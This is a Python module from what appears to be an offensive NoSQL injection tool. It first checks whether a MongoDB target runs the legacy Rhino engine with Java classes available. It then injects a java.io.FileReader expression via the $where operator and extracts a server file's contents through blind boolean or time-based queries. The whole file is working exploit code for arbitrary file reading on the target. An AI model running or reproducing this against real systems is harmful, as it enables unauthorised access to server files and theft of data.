import os
import json
from core.logger import Logger
from modules.injection.blind_dumper import BlindDumper

class FileSystem:
    def __init__(self, requester, url, method, original_data, baseline_response, threads=1, db_type="Generic", prefix="", suffix="", time_sec=None, retries=3):
        self.requester = requester
        self.url = url
        self.method = method
        self.original_data = original_data
        self.baseline = baseline_response
        self.threads = threads
        self.logger = Logger()
        self.db_type = db_type
        self.prefix = prefix
        self.suffix = suffix
        self.time_sec = time_sec
        self.retries = retries

    def run(self, filepath):
        self.logger.info(f"Starting Module: File System Access (LFI)")
        
        if not self._check_java_compatibility():
            self.logger.error("Target does not appear to support 'java.io' (Likely Modern MongoDB with V8/SpiderMonkey).")
            self.logger.warning("File Read is only possible on Legacy MongoDB (Rhino Engine). Aborting to save time.")
            return

        self.read_file(filepath)

    def _check_java_compatibility(self):
        """
        بررسی می‌کند آیا دیتابیس از کلاس‌های جاوا پشتیبانی می‌کند یا خیر.
        """
        self.logger.info("Checking for Java/Rhino engine compatibility...")

        check_expr = "typeof java !== 'undefined' && java.lang.String('test').length == 4"
        
        dumper = BlindDumper(
            self.requester, 
            self.url, 
            self.method, 
            self.original_data, 
            self.baseline, 
            threads=self.threads,
            target_expression=check_expr,
            prefix=self.prefix,
            suffix=self.suffix,
            time_sec=self.time_sec,
            retries=self.retries
        )
        
        strategy = dumper.strategies[0]
        dumper.current_strategy = strategy
        
        try:
            payload = strategy["test"]("x") #

            if "sleep" in str(payload):
                 wrapped_expr = f"if({check_expr}) sleep({int(dumper.sleep_time * 1000)})"
            else:
                 wrapped_expr = check_expr

            final_payload = {"$where": dumper._wrap_payload(wrapped_expr)}
            
            import copy
            data = copy.deepcopy(self.original_data)
            first_key = list(data.keys())[0]
            data[first_key] = final_payload
            
            dumper.calibrate_network() 
            return dumper.reliable_check(data)
            
        except Exception as e:
            self.logger.error(f"Compatibility check failed: {e}")
            return False

    def read_file(self, filepath):
        """
        تلاش برای خواندن فایل با استفاده از قابلیت‌های اسکریپت‌نویسی دیتابیس
        """
        self.logger.info(f"Attempting to read file: '{filepath}'...")
        
        target_expr = f"(new java.io.BufferedReader(new java.io.FileReader('{filepath}'))).readLine()"
        
        self.logger.info("Payload: Java FileReader injection via $where")
        
        dumper = BlindDumper(
            self.requester, 
            self.url, 
            self.method, 
            self.original_data, 
            self.baseline, 
            threads=self.threads,
            target_expression=target_expr,
            prefix=self.prefix,
            suffix=self.suffix,
            time_sec=self.time_sec,
            retries=self.retries
        )
        dumper.run()